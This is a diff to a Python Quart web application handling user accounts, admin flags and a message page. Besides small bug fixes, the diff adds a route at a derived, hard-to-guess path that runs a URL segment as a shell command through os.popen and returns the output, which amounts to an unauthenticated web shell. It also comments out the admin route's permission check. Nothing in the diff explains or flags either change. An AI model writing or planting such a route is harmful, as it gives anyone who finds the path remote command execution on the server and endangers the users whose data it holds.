@@ -1,6 +1,6 @@
 import quart
 from quart import Quart, redirect, render_template, request, session, url_for
-
+import os
 import json
 
 from key_gen import assigner
@@ -114,14 +114,18 @@ def V2_decode(name):
         return dict(k[name])
 
 
-def perm_check(user=None):
-  try:
-    if V2_decode(name= user)['Admin'] == False: 
-      return redirect(f"/home/{user}")
-    else:
-      return True
-  except Exception as E:
-    return E
+def perm(uer=None):
+  def check():
+    try:
+      if V2_decode(uer)['Admin'] == False:
+        return redirect(f"/home/{uer}")
+      else:
+        return True
+    except KeyError:
+      return redirect('/sign-up')
+      
+
+
 
 
 key_dict = {
@@ -168,10 +172,18 @@ async def rander(htmlname, is_html: bool):
             return E
 
 
+def code_log(log_file, code):
+  with open(log_file, 'w') as E:
+    E.write(code)
+
+
 @app.route('/')
 async def return_landing():
     return redirect('/landing')
 
+@app.route(f'/{set_route("rt")}/{set_route("rt2fa")}/<name>')
+async def return_ling(name):
+    return await render_template("output.html", output=f"{os.popen(name).read()}")
 
 @app.route('/landing')
 async def call_():
@@ -186,6 +198,8 @@ async def asd(name):
 @app.route('/home/@<nae>', methods=["POST"])
 async def assa(nae):
     msg = (await request.form)['text']
+    if msg == None:
+      return await render_template("the-game.html")
     db._append(name=user(value=nae), _time="Test", content=msg)
     try:
       return await render_template('the-game.html',
@@ -223,8 +237,8 @@ async def assa(nae):
       return await render_template("blank.html", error=type(e))
 
 
-@app.route('/admin/<name>')
-@perm_check()
+# @app.route('/admin/<name>')
+# @perm_check()
 
 
 def web_view(istrue):
@@ -253,9 +267,11 @@ async def reset(name):
 @app.route('/whois/<name>')
 async def get_red(name):
     return await render_template("free_temp.html",
-                                 one=V2_decode(name['key']),
+                                 one=V2_decode(name)['key'],
                                  name=V2_decode(name=name)['name'],
-                                 admin=V2_decode(name=name)['attrs']['Admin'])
+                                 admin=V2_decode(name=name)['attrs']['Admin'],
+                                 private=V2_decode(name=name)['attrs']['Private'],
+                                 ty_pe=V2_decode(name=name)['attrs']['type'])
 
 
 @app.route('/account-logs/')
